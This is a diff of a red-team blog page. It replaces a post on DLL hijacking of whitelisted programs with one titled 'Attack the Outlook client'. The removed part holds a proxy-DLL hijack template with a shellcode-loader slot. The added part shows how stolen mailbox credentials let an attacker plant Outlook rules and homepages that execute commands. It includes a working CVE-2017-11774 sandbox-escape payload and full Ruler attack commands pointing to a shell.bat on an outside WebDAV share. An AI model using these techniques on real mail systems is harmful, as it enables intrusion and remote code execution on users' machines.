@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DLL hijacking the whitelist application online, Yangsir">
+    <meta name="keywords" content="Attack the Outlook client, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DLL hijacking the whitelist application online | Yangsir</title>
+    <title>Attack the Outlook client | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153315676.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DLL hijacking the whitelist application online</h1>
+                    <h1 class="description center-align post-title">Attack the Outlook client</h1>
                 </div>
             </div>
         </div>
@@ -436,8 +436,20 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Bypass/">
-                                <span class="chip bg-color">Bypass</span>
+                            <a href="/tags/Exchange/">
+                                <span class="chip bg-color">Exchange</span>
+                            </a>
+                        
+                            <a href="/tags/Ruler/">
+                                <span class="chip bg-color">Ruler</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/">
+                                <span class="chip bg-color">RCE</span>
+                            </a>
+                        
+                            <a href="/tags/Outlook/">
+                                <span class="chip bg-color">Outlook</span>
                             </a>
                         
                     </div>
@@ -461,28 +473,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-08-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-21
+                    2021-08-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    469
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    7 Min
                 </div>
                 
 
@@ -505,167 +517,123 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();
+                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Outlook is a special software for email management in Office software. Exchange users can use Outlook to manage emails. It is also one of the most widely used Office software. Outlook is very powerful, some of the legitimate functions due to its particularity, when some of the attacker&#39;s tactics can often achieve unexpected results<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-DWORD WINAPI DDOS(LPVOID lpParameter)
-&#123;
-	your shellcode loader
-&#125;
+<h2 id="Rules-and-Notices"><a href="#Rules-and-Notices" class="headerlink" title="Rules and Notices"></a>Rules and Notices</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The rules and notification functions can be used to set policies for email receiving and sending, including rule conditions and actions. When certain conditions are met, a specified action is triggered, such as managing emails or even starting programs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-static
-HMODULE g_OldModule &#x3D; NULL;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152344733.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">When you get a password for an email account, you can use that password to add rules that allow the target to execute special commands, such as bounce shell, when it receives a particular message
 
-VOID WINAPI Free()
-&#123;
-	if (g_OldModule)
-	&#123;
-		FreeLibrary(g_OldModule);
-	&#125;
-&#125;
+Note that the user needs to open outlook to activate the command. It cannot be triggered without outlook. However, if the owa is opened and the outlook is opened, the command can also be triggered<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">The new rule is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-BOOL WINAPI Load()
-&#123;
-	TCHAR tzPath[MAX_PATH];
-	TCHAR tzTemp[MAX_PATH * 2];
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152917869.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152935119.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">you can make your exe in the smb share such as <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153011742.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Confirm receiving emails with related topics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-	&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); 
-	&#x2F;&#x2F;PathRemoveFileSpec(tzPath);
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153129873.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">read the email target will online like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-	GetSystemDirectory(tzPath, MAX_PATH); 
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153315676.png"></p>
+<h2 id="The-home-page"><a href="#The-home-page" class="headerlink" title="The home page"></a>The home page</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The Outlooke client provides a feature that allows users to set the home page of the inbox interface while using Outlook, loading external urls through the inbox properties and rendering the inbox page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-	lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803163542055.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">As the setting property of the inbox, the inbox homepage URL is synchronized between the Outlook client and the Exchange server. You can directly set this property when interacting with the Exchange server through the MAPI&#x2F;HTTP protocol. Therefore, on the premise that you have legitimate mailbox credentials, you can use this function to set the URL attribute of inbox home page for the mailbox user and point it to the page containing malicious code. When the user browse and refresh the inbox in Outlook, the malicious page will be loaded and the malicious script code will be executed to form the remote command execution<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-	g_OldModule &#x3D; LoadLibrary(tzPath);
-	if (g_OldModule &#x3D;&#x3D; NULL)
-	&#123;
-		wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-	&#125;
+<h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html">With the aggressive window_onLoad function, an object of type wscript. Shell is created when the page loads, and then the command program is executed
 
-	return (g_OldModule !&#x3D; NULL);
+Note:
+The URL to which the home page of the Outlook inbox points is loaded in Outlook via the Iframe tag, and its execution of WScript or VBScript is limited by the sandbox environment, which prevents the script code from being used to create sensitive malicious objects. That is, the CreateObject(" wscript. Shell ") command cannot be executed directly. Here, however, you can escape the Outlook sandbox by loading the ActiveX component associated with the Outlook view, and then getting the ViewCtl1 object from which you can get the application object OutlookApplication, which represents the entire Outlook application. You can then call the CreateObject method directly from the Outlook application object to create a new application object, wscript. Shell, and execute any command
 
-&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Language<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en-us<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=windows-1252<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Outlook<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>clientEventHandlersVBS</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>vbscript</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
+  Sub <span class="token function">window_onload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+     Set Application <span class="token operator">=</span> ViewCtl1<span class="token punctuation">.</span>OutlookApplication
+     Set cmd <span class="token operator">=</span> Application<span class="token punctuation">.</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>
+     cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>
+ End Sub
+<span class="token operator">--</span><span class="token operator">></span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clsid:0006F063-0000-0000-C000-000000000046<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ViewCtl1<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-FARPROC WINAPI GetAddress(PCSTR pszProcName)
-&#123;
-	FARPROC fpAddress;
-	CHAR szProcName[64];
-	TCHAR tzTemp[MAX_PATH];
+<h2 id="Use-Tools"><a href="#Use-Tools" class="headerlink" title="Use Tools"></a>Use Tools</h2><h3 id="From【KB4011091-FIX】"><a href="#From【KB4011091-FIX】" class="headerlink" title="From【KB4011091 FIX】"></a>From【KB4011091 FIX】</h3><pre class="line-numbers language-none"><code class="language-none">get 
+.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form display
 
-	fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);
-	if (fpAddress &#x3D;&#x3D; NULL)
-	&#123;
-		if (HIWORD(pszProcName) &#x3D;&#x3D; 0)
-		&#123;
-			wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);
-			pszProcName &#x3D; szProcName;
-		&#125;
+add
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form add --suffix test --input C:\test\t.txt --rule --send
+txt:
+your command exec code
 
-		wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-		ExitProcess(-2);
-	&#125;
-	return fpAddress;
-&#125;
+att
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  send --target icle@rootkit.org --suffix test --subject &quot;test&quot; --body &quot;test&quot;
 
-BOOL WINAPI Init()
-&#123;
-	pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);
-	pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);
-	return TRUE;
-&#125;
+del
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  delete --suffix test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
-&#123;
-	HANDLE hProcess;
+<h3 id="Ruler"><a href="#Ruler" class="headerlink" title="Ruler"></a>Ruler</h3><pre class="line-numbers language-none"><code class="language-none">get
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug display
 
-	PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);
-	BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;
+add
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  —-location &quot;\\\\192.168.3.145\\webdav\\shell.bat&quot; —-trigger test —-name test
 
-	
-	hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
-	if (hProcess)
-	&#123;
-		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);
+att
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug send --subject &quot;test&quot;  --body &quot;test&quot;
 
-		CloseHandle(hProcess);
-	&#125;
+del
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug delete —id XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-	return 0;
-&#125;
+<h3 id="Homepage【CVE-2017-11774修复】"><a href="#Homepage【CVE-2017-11774修复】" class="headerlink" title="Homepage【CVE-2017-11774修复】"></a>Homepage【CVE-2017-11774修复】</h3><pre class="line-numbers language-none"><code class="language-none">the same easy ways
 
+.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug homepage display
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
-&#123;
-	HANDLE threadHandle;
-	threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);
-	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)
-	&#123;
+.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 —-verbose -—debug homepage add —-url https:&#x2F;&#x2F;192.168.3.144&#x2F;aspnet_client&#x2F;1.html
 
-		DisableThreadLibraryCalls(hModule);
+.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug homepage delete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-		if (Load() &amp;&amp; Init())
-		&#123;
-			TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);
-			TCHAR szCurName[MAX_PATH];
+<h3 id="Special-Notes"><a href="#Special-Notes" class="headerlink" title="Special Notes"></a>Special Notes</h3><pre class="line-numbers language-none"><code class="language-none">In some environments, RPC authentication may be successful, but attacks still cannot be attacked
 
-			GetModuleFileName(NULL, szCurName, MAX_PATH);
-			PathStripPath(szCurName);
+It is not solved at present, and I don&#39;t know the reason for it. If any master knows, please inform me, thank you
 
-			
-			if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)
-			&#123;
-				
-				HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
-				if (hThread)
-				&#123;
-					CloseHandle(hThread);
-				&#125;
-			&#125;
-		&#125;
-	&#125;
-	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)
-	&#123;
-		Free();
-	&#125;
+Like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-	return TRUE;
-&#125;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210804204540031.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">In my fail&#39;s environment, the ruler meet some problem like this:
 
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaAllInfo;
-&#125;
+There is still an error in all English directories, release and personal compilation are not available
 
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaTemp;
-&#125;
+[*] Autodiscover step 0 - URL: https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml
+[*] EXPR provider was selected
+[*] Authentication scheme is NTLM
+[*] RPC URL set: http:&#x2F;&#x2F;owa2013.rootkit.org&#x2F;rpc&#x2F;rpcproxy.dll?49f2f623-0a1c-4a39-860f-6fc88d9ee943@rootkit.org:6001
+[*] Setting up channels
+[+] Binding to RPC
+panic: runtime error: slice bounds out of range [16:0]
 
-void test()
-&#123;
-	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);
-	if (hDllInst)
-	&#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc)
-		&#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+goroutine 39 [running]:
+github.com&#x2F;sensepost&#x2F;ruler&#x2F;utils.ReadBytes(...)
+	&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;utils&#x2F;utils.go:223
+github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.(*RPCResponse).Unmarshal(0xc00010fe50, 0xc0001a8172, 0x1b, 0xe8e, 0x1, 0xc0000f82a0, 0x0)
+	&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;packets.go:472 +0x37f
+github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpenOut(0xc0004a6070, 0x61, 0xc0004ea000, 0xc0004ea060)
+	&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:237 +0x253
+created by github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpen
+	&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:190 +0x11b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210804204755843.png"></p>
 
                 
             </div>
@@ -692,7 +660,7 @@ void test()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/">https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/</a>
+                    <a href="https://yangsirrr.github.io/2021/08/04/attack-the-outlook-client/">https://yangsirrr.github.io/2021/08/04/attack-the-outlook-client/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -734,8 +702,20 @@ void test()
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Bypass/">
-                                    <span class="chip bg-color">Bypass</span>
+                                <a href="/tags/Exchange/">
+                                    <span class="chip bg-color">Exchange</span>
+                                </a>
+                            
+                                <a href="/tags/Ruler/">
+                                    <span class="chip bg-color">Ruler</span>
+                                </a>
+                            
+                                <a href="/tags/RCE/">
+                                    <span class="chip bg-color">RCE</span>
+                                </a>
+                            
+                                <a href="/tags/Outlook/">
+                                    <span class="chip bg-color">Outlook</span>
                                 </a>
                             
                         </div>
@@ -781,69 +761,17 @@ void test()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
-            <div class="card">
-                <a href="/2021/07/21/sensitive-path-information-concerns/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Sensitive path information concerns">
-                        
-                        <span class="card-title">Sensitive path information concerns</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Essays-record/" class="post-category">
-                                    Essays record
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
-                    </a>
-                    
-                    <a href="/tags/Information-collection/">
-                        <span class="chip bg-color">Information collection</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
             </div>
             <div class="card">
-                <a href="/2021/07/19/dll-hijacking-from-hijacking-to-on-line/">
+                <a href="/2021/08/04/attack-the-outlook-client/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" class="responsive-img" alt="DLL hijacking from hijacking to on-line">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153315676.png" class="responsive-img" alt="Attack the Outlook client">
                         
-                        <span class="card-title">DLL hijacking from hijacking to on-line</span>
+                        <span class="card-title">Attack the Outlook client</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -854,7 +782,7 @@ void test()
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-04
                             </span>
                         <span class="publish-author">
                             
@@ -868,6 +796,7 @@ void test()
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -875,8 +804,72 @@ void test()
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
+                    <a href="/tags/Exchange/">
+                        <span class="chip bg-color">Exchange</span>
+                    </a>
+                    
+                    <a href="/tags/Ruler/">
+                        <span class="chip bg-color">Ruler</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                    <a href="/tags/Outlook/">
+                        <span class="chip bg-color">Outlook</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png" class="responsive-img" alt="A solution to the failure of the trust relationship between this workstation and the primary domain">
+                        
+                        <span class="card-title">A solution to the failure of the trust relationship between this workstation and the primary domain</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
